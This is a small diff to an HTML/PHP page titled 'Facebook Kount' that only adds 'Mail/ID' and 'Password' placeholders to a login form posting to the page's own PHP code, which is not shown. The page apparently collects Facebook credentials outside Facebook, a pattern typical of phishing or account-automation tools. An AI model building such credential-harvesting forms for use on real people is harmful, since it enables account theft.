@@ -13,8 +13,8 @@
 <div id="box" style="height: 30px;">
 <p style="color: white; font-family: arial; padding-top:5 px; text-align: center;">Facebook Kount</p>
 <form action="" method="POST">
-<input class="form-control" type="text" name="user" id="user"placeholder=""/>
-<input class="form-control" type="password" name="pass" id="pass" placeholder=""/>
+<input class="form-control" type="text" name="user" id="user"placeholder="Mail/ID"/>
+<input class="form-control" type="password" name="pass" id="pass" placeholder="Password"/>
 <input class="btn btn-warning" type="submit" name="submit" value="Okla"/>
 </form>
 <?php
